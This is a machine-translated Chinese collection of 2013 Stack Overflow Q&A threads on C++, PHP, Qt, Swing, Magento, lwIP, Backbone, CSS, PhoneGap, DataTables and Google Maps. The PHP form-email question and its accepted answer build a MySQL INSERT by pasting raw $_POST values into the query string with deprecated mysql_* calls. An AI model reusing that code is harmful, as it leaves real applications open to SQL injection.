    symbolTable *tempNode;
    tempNode = new symbolTable;
    tempNode->kind = kind; //Run Time error Here..
    tempNode->type = type;
    tempNode->lexeme = identifier;
    tempNode->offSet = tempOffset;
    tempNode->nextTable = NULL;
    tempNode->nextSymbol = root;
    root = tempNode;
} 
```

这`Access Violation`意味着您正在写入未分配的内存。并且您绝不能`malloc`在 C++ 中使用，因为它不会调用`constructors`，始终用于`new`创建动态对象并`delete`释放它们。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T19:29:36.023

我在 gcc 4.5.3 下做了一个非常简单的测试：

```
#include <iostream>
#include <string>

struct A
{
  std::string a;
};

int main()
{
   A* ptr = new A;
   ptr->a = "hello";
   std::cout << ptr->a << std::endl;

   //A aStruct;
   A* ptr2 = (A*)malloc(sizeof(A));
   //ptr2 = &aStruct;
   ptr2->a = "hello again";   //simulate what you have done in your code
   std::cout << ptr2->a << std::endl;
   std::cin.get();
}; 
```

`ptr2`由于尝试访问原始内存，这将导致核心转储。但是，如果我取消注释：

```
//A aStruct;
//ptr2 = &aStruct; 
```

然后它按预期工作。因此，您应该使用`new`而不是`malloc`. 原因是`new`会调用类的构造函数来初始化分配的内存块，然而，`malloc`不会那样做。

# php - 通过电子邮件发送数组中的值

> ID：15750089
> 
> 赞同：0
> 
> 时间：2013-04-01T19:15:35.987
> 
> 标签：php, arrays, email

我是 PHP 新手，在通过电子邮件从 html 表单字段（数组）发送数据时遇到问题。我将每个数组值插入 MySQL 数据库时没有问题，但在尝试通过电子邮件发送数组值时我只是得到空白。

在电子邮件 $school 中，$first_name 和 $title 没有返回任何数组值。请帮忙，谢谢。

```
 <?php

for($i = 0; $i < 5; $i++)
{
$date = date("m/d/y", time());
$referee = $_POST['referee'];
$email_address = $_POST['email_address'];
$phone = $_POST['phone'];
$gamedate = $_POST['gamedate'];
$level = $_POST['level'];
$home = $_POST['home'];
$away = $_POST['away'];
$title = $_POST['title'][$i];
$person = $_POST['person'][$i];
$first_name = $_POST['first_name'][$i];
$jersey = $_POST['jersey'][$i];
$school = $_POST['school'][$i];
$reason = $_POST['reason'][$i];
$notes = $_POST['notes'][$i];
$checkbox = $_POST['checkbox'];

$result = mysql_query("
    INSERT INTO `soccercard` (date, referee, email_address, phone, gamedate, level, home, away, title, person, first_name, jersey, school, reason,  notes, checkbox)
    VALUES ('$date', '$referee', '$email_address', '$phone', '$gamedate', '$level', '$home', '$away', '$title', '$person', '$first_name', '$jersey', '$school', '$reason', '$notes', '$checkbox');
");

}

?>

<?php
if ($title = Red)
$to = "myemail@address.com";
$subject = "Soccer Card Report Form";
$message = ("A red card was submitted by '$referee' for the '$home' vs '$away' '$level'  game. $school $first_name was issued a $title card for $reason ");
$from = "myemail@address.com";
$headers = "From:" . $from;
mail($to,$subject,$message,$headers);
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:20:20.827

将代码更改为

```
 <?php

for($i = 0; $i < 5; $i++)
{
$date = date("m/d/y", time());
$referee = $_POST['referee'];
$email_address = $_POST['email_address'];
$phone = $_POST['phone'];
$gamedate = $_POST['gamedate'];
$level = $_POST['level'];
$home = $_POST['home'];
$away = $_POST['away'];
$title = $_POST['title'][$i];
$person = $_POST['person'][$i];
$first_name = $_POST['first_name'][$i];
$jersey = $_POST['jersey'][$i];
$school = $_POST['school'][$i];
$reason = $_POST['reason'][$i];
$notes = $_POST['notes'][$i];
$checkbox = $_POST['checkbox'];

$result = mysql_query("
    INSERT INTO `soccercard` (date, referee, email_address, phone, gamedate, level, home, away, title, person, first_name, jersey, school, reason,  notes, checkbox)
    VALUES ('$date', '$referee', '$email_address', '$phone', '$gamedate', '$level', '$home', '$away', '$title', '$person', '$first_name', '$jersey', '$school', '$reason', '$notes', '$checkbox');
");
if ($title == 'Red'):
$to = "myemail@address.com";
$subject = "Soccer Card Report Form";
$message = ("A red card was submitted by '$referee' for the '$home' vs '$away' '$level'  game. $school $first_name was issued a $title card for $reason ");
$from = "myemail@address.com";
$headers = "From:" . $from;
mail($to,$subject,$message,$headers);
endif;
} //end of for loop

?> 
```

将标题条件放入for循环

# sql - Qt QSql 类错误

> ID：15750091
> 
> 赞同：0
> 
> 时间：2013-04-01T19:15:41.260
> 
> 标签：sql, qt, compiler-errors, sqlconnection

我正在尝试在 Qt 5.0 中创建与数据库的连接，但出现这些错误！

```
In function `_tcf_0':
error: undefined reference to `_imp___ZN12QSqlDatabaseD1Ev'
error: undefined reference to `_imp___ZN12QSqlDatabase11addDatabaseERK7QStringS2_'
error: ld returned 1 exit status 
```

我复制了帮助的示例代码，但仍然遇到相同的错误：

```
#include <QtSql/QSqlDatabase> 
QSqlDatabase db = QSqlDatabase::addDatabase("QMYSQL"); 
```

这是 Qt 错误还是我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:21:44.363

您是否在 pro 文件中将 sql 添加到 QT 变量中，如下所示：

```
QT += core gui sql 
```

?

# java - getPreferredSize() 在 pack() 之后只调用了两次

> ID：15750092
> 
> 赞同：2
> 
> 时间：2013-04-01T19:15:41.787
> 
> 标签：java, swing, jframe, jpanel, preferredsize

为什么在 a`getPreferredSize()`上调​​用时只调用两次，如下例所示：`pack()``JFrame`

```
public class PackTest {
    static JFrame f = new JFrame();
    @SuppressWarnings("serial")
    public static void main(String[] args) {
        f.add(new JPanel() {
            int i = 0;
            @Override
            public Dimension getPreferredSize() {
                System.out.println("getPreferredSize() called");
                if(i++ >= 2)
                    return new Dimension(200, 200); // This is never returned
                else
                    return new Dimension(100, 100);
            }
        });
        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        f.pack();
        f.setVisible(true);
        for(int i = 0; i < 10; i++) {
            try {
                TimeUnit.SECONDS.sleep(1);
            } catch(InterruptedException e) {}
            SwingUtilities.invokeLater(new Runnable() {
                @Override
                public void run() {
                    System.out.println("Calling pack()");
                    f.pack();
                }
            });
        }
    }
} 
```

似乎`getPreferredSize()`只有在它不断返回不同的东西时才会被调用（即，如果它每次返回不同的维度，在示例中它将被调用 10 次）。为什么 Swing 会这样做，以及如何正确`pack()`调整大小`JFrame`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:21:55.463

尝试重新验证您的 JPanel 以使其调用它的preferredSize：

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;

public class PackTest {

   public static void main(String[] args) {
      SwingUtilities.invokeLater(new Runnable() {
         public void run() {
            createAndShowGui();
         }
      });
   }

   public static void createAndShowGui() {
      final JFrame f = new JFrame();
      final JPanel panel = new JPanel() {
         int i = 0;

         @Override
         public Dimension getPreferredSize() {
            System.out.println("getPreferredSize() called");
            if (i++ >= 2)
               return new Dimension(200, 200); // This is never returned
            else
               return new Dimension(100, 100);
         }
      };
      f.add(panel);
      f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
      f.pack();
      f.setVisible(true);

      int delay = 1000;
      new Timer(delay, new ActionListener() {

         @Override
         public void actionPerformed(ActionEvent arg0) {
            System.out.println("Calling pack()");
            panel.revalidate();
            f.pack();
         }
      }).start();
   }
} 
```

顺便说一句，您需要确保在您的真实代码中努力遵守 Swing 线程规则。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-01T19:28:39.737

`getPreferredSize()`总是在父容器调整大小或重新验证时调用。无论`Dimension`此方法返回的值是什么，它都会在组件（如果被覆盖）上强制执行固定大小，无论窗口和其他组件的大小如何，它都不应更改。

# magento - 表单元素“多行”是否损坏？

> ID：15750102
> 
> 赞同：3
> 
> 时间：2013-04-01T19:16:16.380
> 
> 标签：magento, magento-1.7

我正在尝试在管理面板中创建一个输入字段，用户可以在其中输入多个值。我偶然发现了`multiline`似乎非常适合我想要的前端类型。我将该字段添加到管理面板，如下所示：

**系统.xml**：

```
...
<fields>
    <notification_recipients>
        <frontend_type>multiline</frontend_type>
        <line_count>10</line_count>
... 
```

但是有两个问题：

*   保存字段后，行中的设置将连接到第一个字段中：

![在此处输入图像描述](https://i.stack.imgur.com/35Ium.jpg)

此外，正如您在屏幕截图中看到的那样，在渲染字段时不考虑“行数”参数。**我从/lib/Varien/Data/Form/Element/Multiline.php**发现了“行数” ：

```
class Varien_Data_Form_Element_Multiline extends Varien_Data_Form_Element_Abstract
        ...
        public function getElementHtml()
        {
            ...
            $lineCount = $this->getLineCount(); 
```

所以现在我的问题是：我应该避免使用这个字段类型，因为它有问题（我在网上几乎找不到对这个字段类型的任何引用）还是我做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-11T14:32:16.803

因此，经过几个小时的研究，似乎无法可靠地使用该领域。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-10-21T15:57:24.493

我要出去说多线有很多问题

1.  您必须根据您的分隔符`implode`定义自己的后端模型。只有保存工作正常的意思，但加载失败。`explode``Mage_Eav_Model_Entity_Attribute_Backend_Array``implode`
2.  它完全不适用于“更新属性”产品批量操作。如果您不输入数据，`Array`即使您没有更改属性，它也会覆盖该字段。
3.  管理员操作日志不会愉快地显示正在更改的值

这些东西让我很痛苦，我想我将来会继续后悔使用多线。

# c - 使用 microblaze 和 lwip 进行简单的数据传输

> ID：15750103
> 
> 赞同：3
> 
> 时间：2013-04-01T19:16:22.497
> 
> 标签：c, lwip, microblaze

所以我在互联网上找不到任何简单的例子，而不是用于 microblaze 和 lwip 的 echo 程序，这对我来说很好，这里是他们的文件：echo.c：

```
/*
 * Copyright (c) 2009 Xilinx, Inc.  All rights reserved.
 *
 * Xilinx, Inc.
 * XILINX IS PROVIDING THIS DESIGN, CODE, OR INFORMATION "AS IS" AS A
 * COURTESY TO YOU.  BY PROVIDING THIS DESIGN, CODE, OR INFORMATION AS
 * ONE POSSIBLE   IMPLEMENTATION OF THIS FEATURE, APPLICATION OR
 * STANDARD, XILINX IS MAKING NO REPRESENTATION THAT THIS IMPLEMENTATION
 * IS FREE FROM ANY CLAIMS OF INFRINGEMENT, AND YOU ARE RESPONSIBLE
 * FOR OBTAINING ANY RIGHTS YOU MAY REQUIRE FOR YOUR IMPLEMENTATION.
 * XILINX EXPRESSLY DISCLAIMS ANY WARRANTY WHATSOEVER WITH RESPECT TO
 * THE ADEQUACY OF THE IMPLEMENTATION, INCLUDING BUT NOT LIMITED TO
 * ANY WARRANTIES OR REPRESENTATIONS THAT THIS IMPLEMENTATION IS FREE
 * FROM CLAIMS OF INFRINGEMENT, IMPLIED WARRANTIES OF MERCHANTABILITY
 * AND FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#include <stdio.h>
#include <string.h>

#include "lwip/err.h"
#include "lwip/tcp.h"

int transfer_data() {
    return 0;
}

void print_app_header()
{
    xil_printf("\n\r\n\r-----lwIP TCP echo server ------\n\r");
    xil_printf("TCP packets sent to port 6001 will be echoed back\n\r");
}

err_t recv_callback(void *arg, struct tcp_pcb *tpcb,
                               struct pbuf *p, err_t err)
{
    /* do not read the packet if we are not in ESTABLISHED state */
    if (!p) {
        tcp_close(tpcb);
        tcp_recv(tpcb, NULL);
        return ERR_OK;
    }

    /* indicate that the packet has been received */
    tcp_recved(tpcb, p->len);

    /* echo back the payload */
    /* in this case, we assume that the payload is < TCP_SND_BUF */
    if (tcp_sndbuf(tpcb) > p->len) {
        err = tcp_write(tpcb, p->payload, p->len, 1);
    } else
        print("no space in tcp_sndbuf\n\r");

    /* free the received pbuf */
    pbuf_free(p);

    return ERR_OK;
}

err_t accept_callback(void *arg, struct tcp_pcb *newpcb, err_t err)
{
    static int connection = 1;

    /* set the receive callback for this connection */
    tcp_recv(newpcb, recv_callback);

    /* just use an integer number indicating the connection id as the
       callback argument */
    tcp_arg(newpcb, (void*)connection);

    /* increment for subsequent accepted connections */
    connection++;

    return ERR_OK;
}

int start_application()
{
    struct tcp_pcb *pcb;
    err_t err;
    unsigned port = 7;

    /* create new TCP PCB structure */
    pcb = tcp_new();
    if (!pcb) {
        xil_printf("Error creating PCB. Out of Memory\n\r");
        return -1;
    }

    /* bind to specified @port */
    err = tcp_bind(pcb, IP_ADDR_ANY, port);
    if (err != ERR_OK) {
        xil_printf("Unable to bind to port %d: err = %d\n\r", port, err);
        return -2;
    }

    /* we do not need any arguments to callback functions */
    tcp_arg(pcb, NULL);

    /* listen for connections */
    pcb = tcp_listen(pcb);
    if (!pcb) {
        xil_printf("Out of memory while tcp_listen\n\r");
        return -3;
    }

    /* specify callback to use for incoming connections */
    tcp_accept(pcb, accept_callback);

    xil_printf("TCP echo server started @ port %d\n\r", port);

    return 0;
} 
```

这是 main.c ：

```
/*
 * Copyright (c) 2009-2010 Xilinx, Inc.  All rights reserved.
 *
 * Xilinx, Inc.
 * XILINX IS PROVIDING THIS DESIGN, CODE, OR INFORMATION "AS IS" AS A
 * COURTESY TO YOU.  BY PROVIDING THIS DESIGN, CODE, OR INFORMATION AS
 * ONE POSSIBLE   IMPLEMENTATION OF THIS FEATURE, APPLICATION OR
 * STANDARD, XILINX IS MAKING NO REPRESENTATION THAT THIS IMPLEMENTATION
 * IS FREE FROM ANY CLAIMS OF INFRINGEMENT, AND YOU ARE RESPONSIBLE
 * FOR OBTAINING ANY RIGHTS YOU MAY REQUIRE FOR YOUR IMPLEMENTATION.
 * XILINX EXPRESSLY DISCLAIMS ANY WARRANTY WHATSOEVER WITH RESPECT TO
 * THE ADEQUACY OF THE IMPLEMENTATION, INCLUDING BUT NOT LIMITED TO
 * ANY WARRANTIES OR REPRESENTATIONS THAT THIS IMPLEMENTATION IS FREE
 * FROM CLAIMS OF INFRINGEMENT, IMPLIED WARRANTIES OF MERCHANTABILITY
 * AND FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#include <stdio.h>

#include "xparameters.h"

#include "netif/xadapter.h"

#include "platform.h"
#include "platform_config.h"

/* defined by each RAW mode application */
void print_app_header();
int start_application();
int transfer_data();

/* missing declaration in lwIP */
void lwip_init();

void
print_ip(char *msg, struct ip_addr *ip) 
{
    print(msg);
    xil_printf("%d.%d.%d.%d\n\r", ip4_addr1(ip), ip4_addr2(ip), 
            ip4_addr3(ip), ip4_addr4(ip));
}

void
print_ip_settings(struct ip_addr *ip, struct ip_addr *mask, struct ip_addr *gw)
{

    print_ip("Board IP: ", ip);
    print_ip("Netmask : ", mask);
    print_ip("Gateway : ", gw);
}

int main()
{
    struct netif *netif, server_netif;
    struct ip_addr ipaddr, netmask, gw;

    /* the mac address of the board. this should be unique per board */
    unsigned char mac_ethernet_address[] = { 0x00, 0x0a, 0x35, 0x00, 0x01, 0x02 };

    netif = &server_netif;

    init_platform();

    /* initliaze IP addresses to be used */
    IP4_ADDR(&ipaddr,  192, 168,   1, 10);
    IP4_ADDR(&netmask, 255, 255, 255,  0);
    IP4_ADDR(&gw,      192, 168,   1,  1);

    print_app_header();
    print_ip_settings(&ipaddr, &netmask, &gw);

    lwip_init();

    /* Add network interface to the netif_list, and set it as default */
    if (!xemac_add(netif, &ipaddr, &netmask, &gw, mac_ethernet_address, PLATFORM_EMAC_BASEADDR)) {
        xil_printf("Error adding N/W interface\n\r");
        return -1;
    }
    netif_set_default(netif);

    /* Create a new DHCP client for this interface.
     * Note: you must call dhcp_fine_tmr() and dhcp_coarse_tmr() at
     * the predefined regular intervals after starting the client.
     */
    /* dhcp_start(netif); */

    /* now enable interrupts */
    platform_enable_interrupts();

    /* specify that the network if is up */
    netif_set_up(netif);

    /* start the application (web server, rxtest, txtest, etc..) */
    start_application();

    /* receive and process packets */
    while (1) {
        xemacif_input(netif);
        tcp_write()
        //transfer_data();
    }

    /* never reached */
    cleanup_platform();

    return 0;
} 
```

现在我根本无法理解这段代码（其中一些但不是全部）你们能告诉我开始如何更改这段代码，而不是回显相同的数据，而是向主机发送一个包含字符串的字符串“嘿” 。谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-27T06:21:14.523

这条线

```
 err = tcp_write(tpcb, p->payload, p->len, 1); 
```

从恢复数据 p (p->payload - 传入消息) 发送回数据 更改它，例如

```
err = tcp_write(tpcb, "hey", 3, 1); 
```

# backbone.js - 搜索backbonejs集合

> ID：15750104
> 
> 赞同：1
> 
> 时间：2013-04-01T19:16:23.067
> 
> 标签：backbone.js

我有一个包含多个模型的主干 js 集合：

```
Model 1:
tag: 1
id : 2
name: test

Model 2:
tag: 3
id: 3
name: test3 
```

如何按标签属性搜索特定模型的集合？就像我想找到带有 tag=2 的模型...我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:19:49.807

使用[`findWhere`](http://backbonejs.org/#Collection-findWhere)：

仅返回集合中与传递的属性匹配的第一个模型。

```
collection.findWhere({tag: 2}) 
```

# php - <<< END 上的回显数组

> ID：15750105
> 
> 赞同：-1
> 
> 时间：2013-04-01T19:16:27.253
> 
> 标签：php

使用此语法时如何回显数组？

```
echo <<< END
<p>$listing['User']['firstname']</p>
END; 
```

上面的代码给了我一条错误消息。似乎如果数组是 1 级深，删除属性中的引号是有效的，但当它是 2 级深数组时，就像我上面的数组一样。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-01T19:17:53.627

你可以试试这个：

```
echo <<<END
<p>{$listing['User']['firstname']}</p>
END; 
```

# google-groups-api - 没有用户身份验证的 Google Groups Settings API？

> ID：15750109
> 
> 赞同：0
> 
> 时间：2013-04-01T19:16:33.023
> 
> 标签：google-groups-api, google-groups-settings

我的 Google Apps for Business 帐户中有数百个组。我想批量更新一堆设置，所以我下载了 PHP 客户端。我不知道如何提供信息来查询和更新设置。似乎一切都是围绕用户使用 Web 浏览器登录的概念设计的。我在 API 控制台的“简单 API 访问”下使用“服务器应用程序密钥（带 IP 锁定）”注册了该应用程序。我似乎无法进行任何查询，但我的权限被拒绝。

示例网址： [https](https://www.googleapis.com/groups/v1/groups/groupname@mydomain.com?key=MY_KEY_HERE) ://www.googleapis.com/groups/v1/groups/groupname@mydomain.com?key=MY_KEY_HERE '

给我：

```
<?xml version="1.0" encoding="UTF-8"?>
<errors xmlns="http://schemas.google.com/g/2005">
 <error>
  <domain>GData</domain>
  <code>required</code>
  <location type="header">Authorization</location>
  <internalReason>Login Required</internalReason>
 </error>
</errors> 
```

这应该是可能的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-08T18:11:58.063

您需要以 Google Apps 超级管理员身份执行 OAuth 2.0 身份验证，才能调用群组设置 API。

您可能只想使用[Dito GAM](http://ditoweb.com/dito-gam)[批量](https://code.google.com/p/google-apps-manager/wiki/BulkOperations)[更新组设置](https://code.google.com/p/google-apps-manager/wiki/GroupSettingsExamples)，而不是重新发明轮子。

# jquery - Omniture SiteCatalyst 和 jQuery 冲突问题

> ID：15750111
> 
> 赞同：0
> 
> 时间：2013-04-01T19:16:35.710
> 
> 标签：jquery, adobe-analytics

我正在使用一个 SiteCatalyst 跟踪脚本，它在没有我想与 jQuery 版本 1.7.1 一起使用的 jQuery 插件的情况下工作得很好。相反，当然，jQuery 插件在没有 SiteCatalyst 的情况下也能正常工作。我已经测试并尝试了多种选择，但都失败了。我该如何解决这个问题？似乎`s`SiteCatalyst 与`$`jQuery 混淆了。任何帮助都是高度可接受的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T04:11:13.323

如果您认为 SiteCatalyst 的`s`实例干扰了其他代码，请与您组织中负责创建支持票证的人员联系。要求他们创建一张票，以生成带有修改后的跟踪实例的新核心 JavaScript 文件。代理生成的新实例总是以`s_`（例如`s_n`或`s_anyword`）为前缀。这个新的跟踪变量不太可能与您的代码存在兼容性问题。

或者，您也可以使用[TagManager](https://microsite.omniture.com/t2/help/en_US/sc/implement/index.html#TagManager)，它允许您定义自己的`s`实例、生成代码并将其部署在您的站点上。这不需要与 Adob​​e 进行任何交互，因为您可以在界面内完成所有操作。

# php - 我有一个二维数组，我想在 PHP 中打开一维数组

> ID：15750112
> 
> 赞同：-1
> 
> 时间：2013-04-01T19:16:39.873
> 
> 标签：php, arrays

我有一个处理 SQL Select 并返回一个数组的函数，当我对我的用户类型表执行 SELECT 时，我收到该数组作为返回：Array ([0] => Array ([typ_cod] => ADM) [1 ] => 数组（[0] => CMM [typ_cod] => CMM））

现在我想把它放到一个 $options 数组中，像这样： Array([0] => ADM [1] => CMM )

返回数组的第一个索引是行号，第二个是表的列。如果有人可以帮忙！谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:37:19.597

您可以编写简单的辅助函数

```
function getArrayValueList($RecordList, $RecordItemName)
{
    $Returnlist = array();
    foreach ($RecordList as $RecordIndex => $RecordItem) {
        $Returnlist[] = $RecordItem[$RecordItemName];
    }
    return array_unique($Returnlist);
} 
```

并尝试

```
$array = array(array('typ_cod' => 'AMD'), array('typ_cod' => 'CMM'));
var_dump(getArrayValueList($array, 'typ_cod')); 
```

# post - 如何使用 android sdk 将照片从我的设备发布到朋友的时间轴

> ID：15750113
> 
> 赞同：2
> 
> 时间：2013-04-01T19:16:42.970
> 
> 标签：post, photo, timeline, facebook-android-sdk

我知道在删除通过 Graph API 向朋友墙发帖的功能后，我们应该调用提要对话框。但是提要对话框无法满足我的要求。我想将 SD 卡上的照片发布到朋友的时间线/墙上，就像用户可以使用 Facebook.apk 一样

我的问题是我们是否可以使用 facebook-android-sdk 实现此功能，如果可以，如何（哪个类/方法）？

# css - IE 问题 - 在锚点中使用跨度使 DIV 可点击

> ID：15750114
> 
> 赞同：0
> 
> 时间：2013-04-01T19:16:48.640
> 
> 标签：css, internet-explorer

我正在使用 span 填充锚标记内 DIV 的整个宽度和高度，因此整个 DIV 是可点击的：

```
<style>
.container {
    background-color: #ffffff;
    float: left;
    height: 90px;
    margin-bottom: 10px;
    position: relative;
    width: 290px;
}

.container span {
    height: 100%;
    left: 0;
    position: absolute;
    top: 0;
    width: 100%;
    z-index: 90001;
    display: block;
}

</style>

<div class="container">
    <a href="#" target="_blank">
        <span></span>
    </a>
</div> 
```

效果很好，但在 IE 9 中它似乎没有注册。DIV 不可点击，不知道为什么 IE 有这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:19:03.340

相反，为什么不这样做：

工作示例：

[http://jsfiddle.net/q3PCe/1/](http://jsfiddle.net/q3PCe/1/)

```
<div class="container">
    <a href="#" target="_blank">

    </a>
</div> 
```

CSS：

```
a{
    display: block;
    height: 100%;
    width: 100%;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T19:18:36.497

那你为什么不把它变成这样呢？它应该工作

```
<a href="#">
   <div>
     <!-- Stuff goes here -->
   </div>
</a> 
```

或者使用`onclick="window.location"`for `<div>`（我不会使用这种方法）

# html - 移动应用程序的配置文件 - HTML/Phonegap

> ID：15750115
> 
> 赞同：0
> 
> 时间：2013-04-01T19:16:48.823
> 
> 标签：html, cordova, mobile

我正在使用 PhoneGap 和 HTML5 创建一个移动应用程序。我想将可配置的值（例如服务器名称等）设置到它的单独文件中（类似于ASP.NET 应用程序`App.config`或`Web.config`在 ASP.NET 应用程序中）。

我知道 HTML5 支持一些存储机制，例如 WebSQL 等。我应该使用其中一种吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T03:24:19.090

js文件中的配置呢？就像 app.ServerName=""

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-02-10T00:06:29.003

更容易修改 HTML 5 本地存储，如下所示

```
 // Store
 localStorage.setItem("lastname", "Smith");
// Retrieve
document.getElementById("result").innerHTML = localStorage.getItem("lastname"); 
```

资源教程[https://www.w3schools.com/jsref/prop_win_localstorage.asp](https://www.w3schools.com/jsref/prop_win_localstorage.asp)

如果您喜欢阅读文件，您可以使用此处阅读的文件 API 在 JavaScript 中使用阅读文件[https://www.html5rocks.com/en/tutorials/file/dndfiles/](https://www.html5rocks.com/en/tutorials/file/dndfiles/)

# javascript - 将时间戳添加到 CSS id

> ID：15750116
> 
> 赞同：0
> 
> 时间：2013-04-01T19:16:51.260
> 
> 标签：javascript, css

我正在做一些 css 实验，我想要复制在 Adob​​e Edge Animate 中完成的一些事情。在该程序中，您可以创建 100% 唯一命名的 div，避免在网站上遇到同名 div 的可能性。这方面的一个例子是为任何需要 CSS 的元素提供广告服务。即使我将某个 real_cool_container 命名为 id，我也总有可能遇到具有此名称的 div，并完全破坏整个页面。

Edge 能够为页面上该容器的每个实例生成您的命名 id，例如 real_cool_container_028485020。这适用于可能在页面上出现两次的 real_cool_container 的两个实例。

Edge 在某些方面可能会受到限制，因此我想找到一种方法为每个实例添加时间戳值（精确到毫秒），以减少遇到类似 id 的可能性。

Edge 还设法重命名 id，但在该 id 的所有实例中，以便其他脚本仍然可以引用它。

有谁知道如何通过纯代码做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:28:28.630

对于仅使用 Javascript 的方式，您可以尝试：

```
<div id="same"></div>
<div id="same"></div>
<div id="same"></div>

var divs = document.getElementsByTagName('div');
for(var i = 0;i < divs.length;i++){
    divs[i].id += "_"+(new Date().getTime()+i);
}

<div id="same_1364844463671"></div>
<div id="same_1364844463672"></div>
<div id="same_1364844463673"></div> 
```

# javascript - 如何提高具有 9,999 行的 DOM jquery DataTable 的性能/速度？

> ID：15750118
> 
> 赞同：0
> 
> 时间：2013-04-01T19:17:22.430
> 
> 标签：javascript, jquery, dom, datatables

出于“SEO”/客户端的原因，我必须使用 DOM jquery 数据表（[http://datatables.net/index](http://datatables.net/index)）而不是服务器端表运行。我试图解释这会导致性能下降，但想看看是否可以采取任何步骤来改进具有 9,999 行的数据表的呈现？我也需要对所有列进行排序。目前，它需要大约 6 秒的时间并将页面/选项卡从渲染中挂起。

有什么建议（除了去服务器端/ajax）？

谢谢，大卫

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:30:40.083

也许一种方法是出于“SEO”原因（移到视口之外）创建表的虚拟 DOM 渲染，然后使用用户实际与之交互的 JSON 生成另一个可见表。JSON 应该快很多。

# ruby-on-rails-3 - Google Map 未在 Ruby on Rails 3 中显示

> ID：15750119
> 
> 赞同：1
> 
> 时间：2013-04-01T19:17:22.963
> 
> 标签：ruby-on-rails-3, google-maps-api-3, gmaps4rails

**更新：**我已经找到了解决这个问题的方法 - 请参阅本文末尾的评论。

**原始帖子：** 我无法在 Ruby on Rails 3 的视图页面中显示 Google 地图（API 3）。我正在尝试直接执行此操作，而不是使用 GM4R gem，因此 Stack 上的大多数回复我见过的溢出不适用于我的情况。我已经成功地在静态页面上创建了地图，但不是在模型的视图页面上。我的代码组织如下：

**application.js（在应用程序/资产/javascripts 中）：**

```
...
//= require jquery
//= require jquery_ujs
//= require_tree . 
```

**googlemaps.js（应用程序/资产/javascripts 的顶级）：**

```
var map, marker, current_pos, initial_pos = new google.maps.LatLng(49.2649, -123.2351);

function updatePositionDisplay( latlng ) // updates the readout under the map with the supplied position
    {
       document.getElementById('event_latitude').value  = latlng.lat();
       document.getElementById('event_longitude').value = latlng.lng();
    }

function initializemap()
  {
    var mapOptions = { zoom: 14, center: initial_pos, mapTypeId: google.maps.MapTypeId.ROADMAP };
    if (document.getElementById('event_map'))
    { alert( 'There is a map')}
      else {alert('There is no map')}
    map = new google.maps.Map(document.getElementById('event_map'), mapOptions);
    if (map != null) {alert('Map object has been created')}

    updatePositionDisplay( initial_pos );
  }

google.maps.event.addDomListener(window, 'load', initializemap); 
```

**事件/new.html.erb：**

```
<h1>Create New Event:</h1>

<!-- Display map-->
<div id="event_map" style="width: 80%; height: 60%;"></div>

<%= render 'form' %>

<%= link_to 'Back', events_path %> 
```

**events/_form.html.erb（标准 - 由脚手架生成）：**

```
<%= form_for(@event) do |f| %>
  <% if @event.errors.any? %>
    <div id="error_explanation">
      <h2><%= pluralize(@event.errors.count, "error") %> prohibited this event from being saved:</h2>

      <ul>
      <% @event.errors.full_messages.each do |msg| %>
        <li><%= msg %></li>
      <% end %>
      </ul>
    </div>
  <% end %>

  <div class="field">
    <%= f.label :name %><br />
    <%= f.text_field :name %>
  </div>
  <div class="field">
    <%= f.label :user_id %><br />
    <%= f.number_field :user_id %>
  </div>
  <div class="field">
    <%= f.label :latitude %><br />
    <%= f.text_field :latitude %>
  </div>
  <div class="field">
    <%= f.label :longitude %><br />
    <%= f.text_field :longitude %>
  </div>
  <div class="field">
    <%= f.label :startdatetime %><br />
    <%= f.datetime_select :startdatetime %>
  </div>
  <div class="field">
    <%= f.label :enddatetime %><br />
    <%= f.datetime_select :enddatetime %>
  </div>
  <div class="actions">
    <%= f.submit %>
  </div>
<% end %> 
```

**行为和问题总结：**

当我调用 events/new 时，我希望会发生的是我会看到一张地图，然后是一张表格。我已经验证（通过插入 alert() 调用）initializemap 函数被调用并且地图对象不为空（即，它被创建）。此外，表单中的纬度和经度框被正确填写，表明 updatePositionDisplay 代码被正确调用。但是，没有地图出现。

我对此感到非常困惑，因为我通过编写一个可以正确渲染地图的静态页面控制器来启动这个项目。

页面上呈现的代码如下所示：

```
<!DOCTYPE html>
<html>
<head>
  <title>MapApp Prototype</title>
  <!--For alternatives to loading external scripts on all pages, visit: http://railsapps.github.com/rails-javascript-include-external.html-->
  <script src="http://maps.googleapis.com/maps/api/js?sensor=false" type="text/javascript"></script>
  <link href="/assets/application.css?body=1" media="all" rel="stylesheet" type="text/css" />
<link href="/assets/checkins.css?body=1" media="all" rel="stylesheet" type="text/css" />
<link href="/assets/events.css?body=1" media="all" rel="stylesheet" type="text/css" />
<link href="/assets/scaffolds.css?body=1" media="all" rel="stylesheet" type="text/css" />
<link href="/assets/static_pages.css?body=1" media="all" rel="stylesheet" type="text/css" />
<link href="/assets/users.css?body=1" media="all" rel="stylesheet" type="text/css" />
  <script src="/assets/jquery.js?body=1" type="text/javascript"></script>
